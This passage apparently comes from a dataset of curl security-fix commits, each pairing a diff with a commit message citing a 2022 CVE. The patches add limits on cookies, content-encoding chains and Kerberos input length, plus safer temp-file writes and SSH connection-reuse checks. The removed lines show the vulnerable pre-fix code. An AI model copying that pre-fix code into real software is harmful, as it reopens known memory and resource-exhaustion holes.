    + * copies of the Software, and permit persons to whom the Software is

    + * furnished to do so, under the terms of the COPYING file.

    + *

    + * This software is distributed on an "AS IS" basis, WITHOUT WARRANTY OF ANY

    + * KIND, either express or implied.

    + *

    + * SPDX-License-Identifier: curl

    + *

    + ***************************************************************************/

    +

    +#include "curl_setup.h"

    +

    +#if !defined(CURL_DISABLE_COOKIES) || !defined(CURL_DISABLE_ALTSVC) ||  \

    +  !defined(CURL_DISABLE_HSTS)

    +

    +#ifdef HAVE_FCNTL_H

    +#include <fcntl.h>

    +#endif

    +

    +#include "urldata.h"

    +#include "rand.h"

    +#include "fopen.h"

    +/* The last 3 #include files should be in this order */

    +#include "curl_printf.h"

    +#include "curl_memory.h"

    +#include "memdebug.h"

    +

    +/*

    + * Curl_fopen() opens a file for writing with a temp name, to be renamed

    + * to the final name when completed. If there is an existing file using this

    + * name at the time of the open, this function will clone the mode from that

    + * file.  if ''tempname'' is non-NULL, it needs a rename after the file is

    + * written.

    + */

    +CURLcode Curl_fopen(struct Curl_easy *data, const char *filename,

    +                    FILE **fh, char **tempname)

    +{

    +  CURLcode result = CURLE_WRITE_ERROR;

    +  unsigned char randsuffix[9];

    +  char *tempstore = NULL;

    +  struct_stat sb;

    +  int fd = -1;

    +  *tempname = NULL;

    +

    +  if(stat(filename, &sb) == -1 || !S_ISREG(sb.st_mode)) {

    +    /* a non-regular file, fallback to direct fopen() */

    +    *fh = fopen(filename, FOPEN_WRITETEXT);

    +    if(*fh)

    +      return CURLE_OK;

    +    goto fail;

    +  }

    +

    +  result = Curl_rand_hex(data, randsuffix, sizeof(randsuffix));

    +  if(result)

    +    goto fail;

    +

    +  tempstore = aprintf("%s.%s.tmp", filename, randsuffix);

    +  if(!tempstore) {

    +    result = CURLE_OUT_OF_MEMORY;

    +    goto fail;

    +  }

    +

    +  result = CURLE_WRITE_ERROR;

    +  fd = open(tempstore, O_WRONLY | O_CREAT | O_EXCL, 0600);

    +  if(fd == -1)

    +    goto fail;

    +

    +#ifdef HAVE_FCHMOD

    +  {

    +    struct_stat nsb;

    +    if((fstat(fd, &nsb) != -1) &&

    +       (nsb.st_uid == sb.st_uid) && (nsb.st_gid == sb.st_gid)) {

    +      /* if the user and group are the same, clone the original mode */

    +      if(fchmod(fd, sb.st_mode) == -1)

    +        goto fail;

    +    }

    +  }

    +#endif

    +

    +  *fh = fdopen(fd, FOPEN_WRITETEXT);

    +  if(!*fh)

    +    goto fail;

    +

    +  *tempname = tempstore;

    +  return CURLE_OK;

    +

    +fail:

    +  if(fd != -1) {

    +    close(fd);

    +    unlink(tempstore);

    +  }

    +

    +  free(tempstore);

    +

    +  *tempname = NULL;

    +  return result;

    +}

    +

    +#endif /* ! disabled */'
  commit_message: 'fopen: add Curl_fopen() for better overwriting of files


    Bug: https://curl.se/docs/CVE-2022-32207.html

    CVE-2022-32207

    Reported-by: Harry Sintonen

    Closes #9050'
  commit_sha: 20f9dd6bae50b7223171b17ba7798946e74f877f
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/cookie.c\n+++ b/lib/cookie.c\n@@ -482,6 +482,10 @@ Curl_cookie_add(struct\
    \ Curl_easy *data,\n   (void)data;\n #endif\n \n+  DEBUGASSERT(MAX_SET_COOKIE_AMOUNT\
    \ <= 255); /* counter is an unsigned char */\n+  if(data->req.setcookies >= MAX_SET_COOKIE_AMOUNT)\n\
    +    return NULL;\n+\n   /* First, alloc and init a new struct for it */\n   co\
    \ = calloc(1, sizeof(struct Cookie));\n   if(!co)\n@@ -821,7 +825,7 @@ Curl_cookie_add(struct\
    \ Curl_easy *data,\n       freecookie(co);\n       return NULL;\n     }\n-\n+\
    \    data->req.setcookies++;\n   }\n   else {\n     /*\n@@ -1375,7 +1379,8 @@\
    \ static struct Cookie *dup_cookie(struct Cookie *src)\n  *\n  * It shall only\
    \ return cookies that haven't expired.\n  */\n-struct Cookie *Curl_cookie_getlist(struct\
    \ CookieInfo *c,\n+struct Cookie *Curl_cookie_getlist(struct Curl_easy *data,\n\
    +                                   struct CookieInfo *c,\n                  \
    \                  const char *host, const char *path,\n                     \
    \               bool secure)\n {\n@@ -1430,6 +1435,11 @@ struct Cookie *Curl_cookie_getlist(struct\
    \ CookieInfo *c,\n             mainco = newco;\n \n             matches++;\n+\
    \            if(matches >= MAX_COOKIE_SEND_AMOUNT) {\n+              infof(data,\
    \ \"Included max number of cookies (%u) in request!\",\n+                    matches);\n\
    +              break;\n+            }\n           }\n           else\n       \
    \      goto fail;"
  - "--- a/lib/http.c\n+++ b/lib/http.c\n@@ -2711,12 +2711,14 @@ CURLcode Curl_http_bodysend(struct\
    \ Curl_easy *data, struct connectdata *conn,\n }\n \n #if !defined(CURL_DISABLE_COOKIES)\n\
    +\n CURLcode Curl_http_cookies(struct Curl_easy *data,\n                     \
    \       struct connectdata *conn,\n                            struct dynbuf *r)\n\
    \ {\n   CURLcode result = CURLE_OK;\n   char *addcookies = NULL;\n+  bool linecap\
    \ = FALSE;\n   if(data->set.str[STRING_COOKIE] &&\n      !Curl_checkheaders(data,\
    \ STRCONST(\"Cookie\")))\n     addcookies = data->set.str[STRING_COOKIE];\n@@\
    \ -2734,7 +2736,7 @@ CURLcode Curl_http_cookies(struct Curl_easy *data,\n    \
    \     !strcmp(host, \"127.0.0.1\") ||\n         !strcmp(host, \"[::1]\") ? TRUE\
    \ : FALSE;\n       Curl_share_lock(data, CURL_LOCK_DATA_COOKIE, CURL_LOCK_ACCESS_SINGLE);\n\
    -      co = Curl_cookie_getlist(data->cookies, host, data->state.up.path,\n+ \
    \     co = Curl_cookie_getlist(data, data->cookies, host, data->state.up.path,\n\
    \                                secure_context);\n       Curl_share_unlock(data,\
    \ CURL_LOCK_DATA_COOKIE);\n     }\n@@ -2748,6 +2750,13 @@ CURLcode Curl_http_cookies(struct\
    \ Curl_easy *data,\n             if(result)\n               break;\n         \
    \  }\n+          if((Curl_dyn_len(r) + strlen(co->name) + strlen(co->value) +\
    \ 1) >=\n+             MAX_COOKIE_HEADER_LEN) {\n+            infof(data, \"Restricted\
    \ outgoing cookies due to header size, \"\n+                  \"'%s' not sent\"\
    , co->name);\n+            linecap = TRUE;\n+            break;\n+          }\n\
    \           result = Curl_dyn_addf(r, \"%s%s=%s\", count?\"; \":\"\",\n      \
    \                            co->name, co->value);\n           if(result)\n@@\
    \ -2758,7 +2767,7 @@ CURLcode Curl_http_cookies(struct Curl_easy *data,\n    \
    \   }\n       Curl_cookie_freelist(store);\n     }\n-    if(addcookies && !result)\
    \ {\n+    if(addcookies && !result && !linecap) {\n       if(!count)\n       \
    \  result = Curl_dyn_addn(r, STRCONST(\"Cookie: \"));\n       if(!result) {"
  commit_message: 'cookie: apply limits


    - Send no more than 150 cookies per request

    - Cap the max length used for a cookie: header to 8K

    - Cap the max number of received Set-Cookie: headers to 50


    Bug: https://curl.se/docs/CVE-2022-32205.html

    CVE-2022-32205

    Reported-by: Harry Sintonen

    Closes #9048'
  commit_sha: 48d7064a49148f03942380967da739dcde1cdc24
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/content_encoding.c\n+++ b/lib/content_encoding.c\n@@ -1028,12 +1028,16\
    \ @@ static const struct content_encoding *find_encoding(const char *name,\n \
    \  return NULL;\n }\n \n+/* allow no more than 5 \"chained\" compression steps\
    \ */\n+#define MAX_ENCODE_STACK 5\n+\n /* Set-up the unencoding stack from the\
    \ Content-Encoding header value.\n  * See RFC 7231 section 3.1.2.2. */\n CURLcode\
    \ Curl_build_unencoding_stack(struct Curl_easy *data,\n                      \
    \                const char *enclist, int maybechunked)\n {\n   struct SingleRequest\
    \ *k = &data->req;\n+  int counter = 0;\n \n   do {\n     const char *name;\n\
    @@ -1068,6 +1072,11 @@ CURLcode Curl_build_unencoding_stack(struct Curl_easy *data,\n\
    \       if(!encoding)\n         encoding = &error_encoding;  /* Defer error at\
    \ stack use. */\n \n+      if(++counter >= MAX_ENCODE_STACK) {\n+        failf(data,\
    \ \"Reject response due to %u content encodings\",\n+              counter);\n\
    +        return CURLE_BAD_CONTENT_ENCODING;\n+      }\n       /* Stack the unencoding\
    \ stage. */\n       writer = new_unencoding_writer(data, encoding, k->writer_stack);\n\
    \       if(!writer)"
  commit_message: 'content_encoding: return error on too many compression steps


    The max allowed steps is arbitrarily set to 5.


    Bug: https://curl.se/docs/CVE-2022-32206.html

    CVE-2022-32206

    Reported-by: Harry Sintonen

    Closes #9049'
  commit_sha: 3a09fbb7f264c67c438d01a30669ce325aa508e2
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/krb5.c\n+++ b/lib/krb5.c\n@@ -142,11 +142,8 @@ krb5_decode(void *app_data,\
    \ void *buf, int len,\n   enc.value = buf;\n   enc.length = len;\n   maj = gss_unwrap(&min,\
    \ *context, &enc, &dec, NULL, NULL);\n-  if(maj != GSS_S_COMPLETE) {\n-    if(len\
    \ >= 4)\n-      strcpy(buf, \"599 \");\n+  if(maj != GSS_S_COMPLETE)\n     return\
    \ -1;\n-  }\n \n   memcpy(buf, dec.value, dec.length);\n   len = curlx_uztosi(dec.length);\n\
    @@ -508,6 +505,7 @@ static CURLcode read_data(struct connectdata *conn,\n {\n\
    \   int len;\n   CURLcode result;\n+  int nread;\n \n   result = socket_read(fd,\
    \ &len, sizeof(len));\n   if(result)\n@@ -516,16 +514,22 @@ static CURLcode read_data(struct\
    \ connectdata *conn,\n   if(len) {\n     /* only realloc if there was a length\
    \ */\n     len = ntohl(len);\n-    buf->data = Curl_saferealloc(buf->data, len);\n\
    +    if(len > CURL_MAX_INPUT_LENGTH)\n+      len = 0;\n+    else\n+      buf->data\
    \ = Curl_saferealloc(buf->data, len);\n   }\n   if(!len || !buf->data)\n     return\
    \ CURLE_OUT_OF_MEMORY;\n \n   result = socket_read(fd, buf->data, len);\n   if(result)\n\
    \     return result;\n-  buf->size = conn->mech->decode(conn->app_data, buf->data,\
    \ len,\n-                                 conn->data_prot, conn);\n+  nread =\
    \ conn->mech->decode(conn->app_data, buf->data, len,\n+                      \
    \       conn->data_prot, conn);\n+  if(nread < 0)\n+    return CURLE_RECV_ERROR;\n\
    +  buf->size = (size_t)nread;\n   buf->index = 0;\n   return CURLE_OK;\n }"
  commit_message: 'krb5: return error properly on decode errors


    Bug: https://curl.se/docs/CVE-2022-32208.html

    CVE-2022-32208

    Reported-by: Harry Sintonen

    Closes #9051'
  commit_sha: 6ecdf5136b52af747e7bda08db9a748256b1cd09
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/url.c\n+++ b/lib/url.c\n@@ -1100,6 +1100,12 @@ static void prune_dead_connections(struct\
    \ Curl_easy *data)\n   }\n }\n \n+static bool ssh_config_matches(struct connectdata\
    \ *one,\n+                               struct connectdata *two)\n+{\n+  return\
    \ (Curl_safecmp(one->proto.sshc.rsa, two->proto.sshc.rsa) &&\n+          Curl_safecmp(one->proto.sshc.rsa_pub,\
    \ two->proto.sshc.rsa_pub));\n+}\n /*\n  * Given one filled in connection struct\
    \ (named needle), this function should\n  * detect if there already is one that\
    \ has all the significant details\n@@ -1356,6 +1362,11 @@ ConnectionExists(struct\
    \ Curl_easy *data,\n          (data->state.httpwant < CURL_HTTP_VERSION_2_0))\n\
    \         continue;\n \n+      if(get_protocol_family(needle->handler) == PROTO_FAMILY_SSH)\
    \ {\n+        if(!ssh_config_matches(needle, check))\n+          continue;\n+\
    \      }\n+\n       if((needle->handler->flags&PROTOPT_SSL)\n #ifndef CURL_DISABLE_PROXY\n\
    \          || !needle->bits.httpproxy || needle->bits.tunnel_proxy"
  commit_message: 'url: check SSH config match on connection reuse


    CVE-2022-27782


    Reported-by: Harry Sintonen

    Bug: https://curl.se/docs/CVE-2022-27782.html

    Closes #8825'
  commit_sha: 1645e9b44505abd5cbaf65da5282c3f33b5924a5
  repo_name: curl/curl
- commit_diff:
  - "--- a/lib/setopt.c\n+++ b/lib/setopt.c\n@@ -2294,6 +2294,7 @@ CURLcode Curl_vsetopt(struct\
    \ Curl_easy *data, CURLoption option, va_list param)\n \n   case CURLOPT_SSL_OPTIONS:\n\
    \     arg = va_arg(param, long);\n+    data->set.ssl.primary.ssl_options = (unsigned\
    \ char)(arg & 0xff);\n     data->set.ssl.enable_beast = !!(arg & CURLSSLOPT_ALLOW_BEAST);\n\
    \     data->set.ssl.no_revoke = !!(arg & CURLSSLOPT_NO_REVOKE);\n     data->set.ssl.no_partialchain\
    \ = !!(arg & CURLSSLOPT_NO_PARTIALCHAIN);\n@@ -2307,6 +2308,7 @@ CURLcode Curl_vsetopt(struct\
    \ Curl_easy *data, CURLoption option, va_list param)\n #ifndef CURL_DISABLE_PROXY\n\
    \   case CURLOPT_PROXY_SSL_OPTIONS:\n     arg = va_arg(param, long);\n+    data->set.proxy_ssl.primary.ssl_options\
    \ = (unsigned char)(arg & 0xff);\n     data->set.proxy_ssl.enable_beast = !!(arg\
    \ & CURLSSLOPT_ALLOW_BEAST);\n     data->set.proxy_ssl.no_revoke = !!(arg & CURLSSLOPT_NO_REVOKE);\n\
    \     data->set.proxy_ssl.no_partialchain = !!(arg & CURLSSLOPT_NO_PARTIALCHAIN);\n\
    @@ -2745,49 +2747,52 @@ CURLcode Curl_vsetopt(struct Curl_easy *data, CURLoption\
    \ option, va_list param)\n   case CURLOPT_TLSAUTH_USERNAME:\n     result = Curl_setstropt(&data->set.str[STRING_TLSAUTH_USERNAME],\n\
    \                             va_arg(param, char *));\n-    if(data->set.str[STRING_TLSAUTH_USERNAME]\
    \ && !data->set.ssl.authtype)\n-      data->set.ssl.authtype = CURL_TLSAUTH_SRP;\
    \ /* default to SRP */\n+    if(data->set.str[STRING_TLSAUTH_USERNAME] &&\n+ \
    \      !data->set.ssl.primary.authtype)\n+      data->set.ssl.primary.authtype\
    \ = CURL_TLSAUTH_SRP; /* default to SRP */\n     break;\n #ifndef CURL_DISABLE_PROXY\n\
    \   case CURLOPT_PROXY_TLSAUTH_USERNAME:\n     result = Curl_setstropt(&data->set.str[STRING_TLSAUTH_USERNAME_PROXY],\n\
    \                             va_arg(param, char *));\n     if(data->set.str[STRING_TLSAUTH_USERNAME_PROXY]\
    \ &&\n-       !data->set.proxy_ssl.authtype)\n-      data->set.proxy_ssl.authtype\
    \ = CURL_TLSAUTH_SRP; /* default to SRP */\n+       !data->set.proxy_ssl.primary.authtype)\n\
    +      data->set.proxy_ssl.primary.authtype = CURL_TLSAUTH_SRP; /* default to\n\
    +                                                                  SRP */\n  \
    \   break;\n #endif\n   case CURLOPT_TLSAUTH_PASSWORD:\n     result = Curl_setstropt(&data->set.str[STRING_TLSAUTH_PASSWORD],\n\
    \                             va_arg(param, char *));\n-    if(data->set.str[STRING_TLSAUTH_USERNAME]\
    \ && !data->set.ssl.authtype)\n-      data->set.ssl.authtype = CURL_TLSAUTH_SRP;\
    \ /* default to SRP */\n+    if(data->set.str[STRING_TLSAUTH_USERNAME] &&\n+ \
    \      !data->set.ssl.primary.authtype)\n+      data->set.ssl.primary.authtype\
    \ = CURL_TLSAUTH_SRP; /* default */\n     break;\n #ifndef CURL_DISABLE_PROXY\n\
    \   case CURLOPT_PROXY_TLSAUTH_PASSWORD:\n     result = Curl_setstropt(&data->set.str[STRING_TLSAUTH_PASSWORD_PROXY],\n\
    \                             va_arg(param, char *));\n     if(data->set.str[STRING_TLSAUTH_USERNAME_PROXY]\
    \ &&\n-       !data->set.proxy_ssl.authtype)\n-      data->set.proxy_ssl.authtype\
    \ = CURL_TLSAUTH_SRP; /* default to SRP */\n+       !data->set.proxy_ssl.primary.authtype)\n\
    +      data->set.proxy_ssl.primary.authtype = CURL_TLSAUTH_SRP; /* default */\n\
    \     break;\n #endif\n   case CURLOPT_TLSAUTH_TYPE:\n     argptr = va_arg(param,\
    \ char *);\n     if(!argptr ||\n        strncasecompare(argptr, \"SRP\", strlen(\"\
    SRP\")))\n-      data->set.ssl.authtype = CURL_TLSAUTH_SRP;\n+      data->set.ssl.primary.authtype\
    \ = CURL_TLSAUTH_SRP;\n     else\n-      data->set.ssl.authtype = CURL_TLSAUTH_NONE;\n\
    +      data->set.ssl.primary.authtype = CURL_TLSAUTH_NONE;\n     break;\n #ifndef\
    \ CURL_DISABLE_PROXY\n   case CURLOPT_PROXY_TLSAUTH_TYPE:\n     argptr = va_arg(param,\
    \ char *);\n     if(!argptr ||\n        strncasecompare(argptr, \"SRP\", strlen(\"\
    SRP\")))\n-      data->set.proxy_ssl.authtype = CURL_TLSAUTH_SRP;\n+      data->set.proxy_ssl.primary.authtype\
    \ = CURL_TLSAUTH_SRP;\n     else\n-      data->set.proxy_ssl.authtype = CURL_TLSAUTH_NONE;\n\
    +      data->set.proxy_ssl.primary.authtype = CURL_TLSAUTH_NONE;\n     break;\n\
    \ #endif\n #endif"
  - "--- a/lib/url.c\n+++ b/lib/url.c\n@@ -542,7 +542,7 @@ CURLcode Curl_init_userdefined(struct\
    \ Curl_easy *data)\n   set->ssl.primary.verifypeer = TRUE;\n   set->ssl.primary.verifyhost\
    \ = TRUE;\n #ifdef USE_TLS_SRP\n-  set->ssl.authtype = CURL_TLSAUTH_NONE;\n+ \
    \ set->ssl.primary.authtype = CURL_TLSAUTH_NONE;\n #endif\n   set->ssh_auth_types\
    \ = CURLSSH_AUTH_DEFAULT; /* defaults to any auth\n                          \
    \                             type */\n@@ -1758,11 +1758,17 @@ static struct connectdata\
    \ *allocate_conn(struct Curl_easy *data)\n   conn->ssl_config.verifystatus = data->set.ssl.primary.verifystatus;\n\
    \   conn->ssl_config.verifypeer = data->set.ssl.primary.verifypeer;\n   conn->ssl_config.verifyhost\
    \ = data->set.ssl.primary.verifyhost;\n+  conn->ssl_config.ssl_options = data->set.ssl.primary.ssl_options;\n\
    +#ifdef USE_TLS_SRP\n+#endif\n #ifndef CURL_DISABLE_PROXY\n   conn->proxy_ssl_config.verifystatus\
    \ =\n     data->set.proxy_ssl.primary.verifystatus;\n   conn->proxy_ssl_config.verifypeer\
    \ = data->set.proxy_ssl.primary.verifypeer;\n   conn->proxy_ssl_config.verifyhost\
    \ = data->set.proxy_ssl.primary.verifyhost;\n+  conn->proxy_ssl_config.ssl_options\
    \ = data->set.proxy_ssl.primary.ssl_options;\n+#ifdef USE_TLS_SRP\n+#endif\n #endif\n\
    \   conn->ip_version = data->set.ipver;\n   conn->bits.connect_only = data->set.connect_only;\n\
    @@ -3848,26 +3854,29 @@ static CURLcode create_conn(struct Curl_easy *data,\n\
    \     data->set.str[STRING_SSL_ISSUERCERT_PROXY];\n   data->set.proxy_ssl.primary.issuercert_blob\
    \ =\n     data->set.blobs[BLOB_SSL_ISSUERCERT_PROXY];\n-  data->set.proxy_ssl.CRLfile\
    \ = data->set.str[STRING_SSL_CRLFILE_PROXY];\n+  data->set.proxy_ssl.primary.CRLfile\
    \ =\n+    data->set.str[STRING_SSL_CRLFILE_PROXY];\n   data->set.proxy_ssl.cert_type\
    \ = data->set.str[STRING_CERT_TYPE_PROXY];\n   data->set.proxy_ssl.key = data->set.str[STRING_KEY_PROXY];\n\
    \   data->set.proxy_ssl.key_type = data->set.str[STRING_KEY_TYPE_PROXY];\n   data->set.proxy_ssl.key_passwd\
    \ = data->set.str[STRING_KEY_PASSWD_PROXY];\n   data->set.proxy_ssl.primary.clientcert\
    \ = data->set.str[STRING_CERT_PROXY];\n   data->set.proxy_ssl.key_blob = data->set.blobs[BLOB_KEY_PROXY];\n\
    \ #endif\n-  data->set.ssl.CRLfile = data->set.str[STRING_SSL_CRLFILE];\n+  data->set.ssl.primary.CRLfile\
    \ = data->set.str[STRING_SSL_CRLFILE];\n   data->set.ssl.cert_type = data->set.str[STRING_CERT_TYPE];\n\
    \   data->set.ssl.key = data->set.str[STRING_KEY];\n   data->set.ssl.key_type\
    \ = data->set.str[STRING_KEY_TYPE];\n   data->set.ssl.key_passwd = data->set.str[STRING_KEY_PASSWD];\n\
    \   data->set.ssl.primary.clientcert = data->set.str[STRING_CERT];\n #ifdef USE_TLS_SRP\n\
    -  data->set.ssl.username = data->set.str[STRING_TLSAUTH_USERNAME];\n-  data->set.ssl.password\
    \ = data->set.str[STRING_TLSAUTH_PASSWORD];\n+  data->set.ssl.primary.username\
    \ = data->set.str[STRING_TLSAUTH_USERNAME];\n+  data->set.ssl.primary.password\
    \ = data->set.str[STRING_TLSAUTH_PASSWORD];\n #ifndef CURL_DISABLE_PROXY\n-  data->set.proxy_ssl.username\
    \ = data->set.str[STRING_TLSAUTH_USERNAME_PROXY];\n-  data->set.proxy_ssl.password\
    \ = data->set.str[STRING_TLSAUTH_PASSWORD_PROXY];\n+  data->set.proxy_ssl.primary.username\
    \ =\n+    data->set.str[STRING_TLSAUTH_USERNAME_PROXY];\n+  data->set.proxy_ssl.primary.password\
    \ =\n+    data->set.str[STRING_TLSAUTH_PASSWORD_PROXY];\n #endif\n #endif\n  \
    \ data->set.ssl.key_blob = data->set.blobs[BLOB_KEY];"
  - "--- a/lib/vtls/gtls.c\n+++ b/lib/vtls/gtls.c\n@@ -445,9 +445,10 @@ gtls_connect_step1(struct\
    \ Curl_easy *data,\n   }\n \n #ifdef USE_GNUTLS_SRP\n-  if((SSL_SET_OPTION(authtype)\
    \ == CURL_TLSAUTH_SRP) &&\n+  if((SSL_SET_OPTION(primary.authtype) == CURL_TLSAUTH_SRP)\
    \ &&\n      Curl_allow_auth_to_host(data)) {\n-    infof(data, \"Using TLS-SRP\
    \ username: %s\", SSL_SET_OPTION(username));\n+    infof(data, \"Using TLS-SRP\
    \ username: %s\",\n+          SSL_SET_OPTION(primary.username));\n \n     rc =\
    \ gnutls_srp_allocate_client_credentials(&backend->srp_client_cred);\n     if(rc\
    \ != GNUTLS_E_SUCCESS) {\n@@ -457,8 +458,8 @@ gtls_connect_step1(struct Curl_easy\
    \ *data,\n     }\n \n     rc = gnutls_srp_set_client_credentials(backend->srp_client_cred,\n\
    -                                           SSL_SET_OPTION(username),\n-     \
    \                                      SSL_SET_OPTION(password));\n+         \
    \                                  SSL_SET_OPTION(primary.username),\n+      \
    \                                     SSL_SET_OPTION(primary.password));\n   \
    \  if(rc != GNUTLS_E_SUCCESS) {\n       failf(data, \"gnutls_srp_set_client_cred()\
    \ failed: %s\",\n             gnutls_strerror(rc));\n@@ -515,19 +516,19 @@ gtls_connect_step1(struct\
    \ Curl_easy *data,\n   }\n #endif\n \n-  if(SSL_SET_OPTION(CRLfile)) {\n+  if(SSL_SET_OPTION(primary.CRLfile))\
    \ {\n     /* set the CRL list file */\n     rc = gnutls_certificate_set_x509_crl_file(backend->cred,\n\
    -                                              SSL_SET_OPTION(CRLfile),\n+   \
    \                                           SSL_SET_OPTION(primary.CRLfile),\n\
    \                                               GNUTLS_X509_FMT_PEM);\n     if(rc\
    \ < 0) {\n       failf(data, \"error reading crl file %s (%s)\",\n-          \
    \  SSL_SET_OPTION(CRLfile), gnutls_strerror(rc));\n+            SSL_SET_OPTION(primary.CRLfile),\
    \ gnutls_strerror(rc));\n       return CURLE_SSL_CRL_BADFILE;\n     }\n     else\n\
    \       infof(data, \"found %d CRL in %s\",\n-            rc, SSL_SET_OPTION(CRLfile));\n\
    +            rc, SSL_SET_OPTION(primary.CRLfile));\n   }\n \n   /* Initialize\
    \ TLS session as a client */\n@@ -598,7 +599,7 @@ gtls_connect_step1(struct Curl_easy\
    \ *data,\n #ifdef USE_GNUTLS_SRP\n   /* Only add SRP to the cipher list if SRP\
    \ is requested. Otherwise\n    * GnuTLS will disable TLS 1.3 support. */\n-  if(SSL_SET_OPTION(authtype)\
    \ == CURL_TLSAUTH_SRP) {\n+  if(SSL_SET_OPTION(primary.authtype) == CURL_TLSAUTH_SRP)\
    \ {\n     size_t len = strlen(prioritylist);\n \n     char *prioritysrp = malloc(len\
    \ + sizeof(GNUTLS_SRP) + 1);\n@@ -693,7 +694,7 @@ gtls_connect_step1(struct Curl_easy\
    \ *data,\n \n #ifdef USE_GNUTLS_SRP\n   /* put the credentials to the current\
    \ session */\n-  if(SSL_SET_OPTION(authtype) == CURL_TLSAUTH_SRP) {\n+  if(SSL_SET_OPTION(primary.authtype)\
    \ == CURL_TLSAUTH_SRP) {\n     rc = gnutls_credentials_set(session, GNUTLS_CRD_SRP,\n\
    \                                 backend->srp_client_cred);\n     if(rc != GNUTLS_E_SUCCESS)\
    \ {\n@@ -875,8 +876,8 @@ Curl_gtls_verifyserver(struct Curl_easy *data,\n    \
    \    SSL_CONN_CONFIG(verifyhost) ||\n        SSL_CONN_CONFIG(issuercert)) {\n\
    \ #ifdef USE_GNUTLS_SRP\n-      if(SSL_SET_OPTION(authtype) == CURL_TLSAUTH_SRP\n\
    -         && SSL_SET_OPTION(username) != NULL\n+      if(SSL_SET_OPTION(primary.authtype)\
    \ == CURL_TLSAUTH_SRP\n+         && SSL_SET_OPTION(primary.username)\n       \
    \   && !SSL_CONN_CONFIG(verifypeer)\n          && gnutls_cipher_get(session))\
    \ {\n         /* no peer cert, but auth is ok if we have SRP user and cipher and\
    \ no\n@@ -934,7 +935,8 @@ Curl_gtls_verifyserver(struct Curl_easy *data,\n   \
    \      failf(data, \"server certificate verification failed. CAfile: %s \"\n \
    \              \"CRLfile: %s\", SSL_CONN_CONFIG(CAfile) ? SSL_CONN_CONFIG(CAfile):\n\
    \               \"none\",\n-              SSL_SET_OPTION(CRLfile)?SSL_SET_OPTION(CRLfile):\"\
    none\");\n+              SSL_SET_OPTION(primary.CRLfile) ?\n+              SSL_SET_OPTION(primary.CRLfile)\
    \ : \"none\");\n         return CURLE_PEER_FAILED_VERIFICATION;\n       }\n  \
    \     else\n@@ -1564,8 +1566,8 @@ static int gtls_shutdown(struct Curl_easy *data,\
    \ struct connectdata *conn,\n   gnutls_certificate_free_credentials(backend->cred);\n\
    \ \n #ifdef USE_GNUTLS_SRP\n-  if(SSL_SET_OPTION(authtype) == CURL_TLSAUTH_SRP\n\
    -     && SSL_SET_OPTION(username) != NULL)\n+  if(SSL_SET_OPTION(primary.authtype)\
    \ == CURL_TLSAUTH_SRP\n+     && SSL_SET_OPTION(primary.username) != NULL)\n  \
    \   gnutls_srp_free_client_credentials(backend->srp_client_cred);\n #endif\n "
  - "--- a/lib/vtls/mbedtls.c\n+++ b/lib/vtls/mbedtls.c\n@@ -279,7 +279,7 @@ mbed_connect_step1(struct\
    \ Curl_easy *data, struct connectdata *conn,\n   const char * const ssl_capath\
    \ = SSL_CONN_CONFIG(CApath);\n   char * const ssl_cert = SSL_SET_OPTION(primary.clientcert);\n\
    \   const struct curl_blob *ssl_cert_blob = SSL_SET_OPTION(primary.cert_blob);\n\
    -  const char * const ssl_crlfile = SSL_SET_OPTION(CRLfile);\n+  const char *\
    \ const ssl_crlfile = SSL_SET_OPTION(primary.CRLfile);\n   const char * const\
    \ hostname = SSL_HOST_NAME();\n #ifndef CURL_DISABLE_VERBOSE_STRINGS\n   const\
    \ long int port = SSL_HOST_PORT();"
  - "--- a/lib/vtls/nss.c\n+++ b/lib/vtls/nss.c\n@@ -2035,13 +2035,13 @@ static CURLcode\
    \ nss_setup_connect(struct Curl_easy *data,\n     }\n   }\n \n-  if(SSL_SET_OPTION(CRLfile))\
    \ {\n-    const CURLcode rv = nss_load_crl(SSL_SET_OPTION(CRLfile));\n+  if(SSL_SET_OPTION(primary.CRLfile))\
    \ {\n+    const CURLcode rv = nss_load_crl(SSL_SET_OPTION(primary.CRLfile));\n\
    \     if(rv) {\n       result = rv;\n       goto error;\n     }\n-    infof(data,\
    \ \"  CRLfile: %s\", SSL_SET_OPTION(CRLfile));\n+    infof(data, \"  CRLfile:\
    \ %s\", SSL_SET_OPTION(primary.CRLfile));\n   }\n \n   if(SSL_SET_OPTION(primary.clientcert))\
    \ {"
  - "--- a/lib/vtls/openssl.c\n+++ b/lib/vtls/openssl.c\n@@ -2662,7 +2662,7 @@ static\
    \ CURLcode ossl_connect_step1(struct Curl_easy *data,\n #endif\n   const long\
    \ int ssl_version = SSL_CONN_CONFIG(version);\n #ifdef USE_OPENSSL_SRP\n-  const\
    \ enum CURL_TLSAUTH ssl_authtype = SSL_SET_OPTION(authtype);\n+  const enum CURL_TLSAUTH\
    \ ssl_authtype = SSL_SET_OPTION(primary.authtype);\n #endif\n   char * const ssl_cert\
    \ = SSL_SET_OPTION(primary.clientcert);\n   const struct curl_blob *ssl_cert_blob\
    \ = SSL_SET_OPTION(primary.cert_blob);\n@@ -2673,7 +2673,7 @@ static CURLcode\
    \ ossl_connect_step1(struct Curl_easy *data,\n     (ca_info_blob ? NULL : SSL_CONN_CONFIG(CAfile));\n\
    \   const char * const ssl_capath = SSL_CONN_CONFIG(CApath);\n   const bool verifypeer\
    \ = SSL_CONN_CONFIG(verifypeer);\n-  const char * const ssl_crlfile = SSL_SET_OPTION(CRLfile);\n\
    +  const char * const ssl_crlfile = SSL_SET_OPTION(primary.CRLfile);\n   char\
    \ error_buffer[256];\n   struct ssl_backend_data *backend = connssl->backend;\n\
    \   bool imported_native_ca = false;\n@@ -2925,15 +2925,15 @@ static CURLcode\
    \ ossl_connect_step1(struct Curl_easy *data,\n #ifdef USE_OPENSSL_SRP\n   if((ssl_authtype\
    \ == CURL_TLSAUTH_SRP) &&\n      Curl_allow_auth_to_host(data)) {\n-    char *\
    \ const ssl_username = SSL_SET_OPTION(username);\n-\n+    char * const ssl_username\
    \ = SSL_SET_OPTION(primary.username);\n+    char * const ssl_password = SSL_SET_OPTION(primary.password);\n\
    \     infof(data, \"Using TLS-SRP username: %s\", ssl_username);\n \n     if(!SSL_CTX_set_srp_username(backend->ctx,\
    \ ssl_username)) {\n       failf(data, \"Unable to set SRP user name\");\n   \
    \    return CURLE_BAD_FUNCTION_ARGUMENT;\n     }\n-    if(!SSL_CTX_set_srp_password(backend->ctx,\
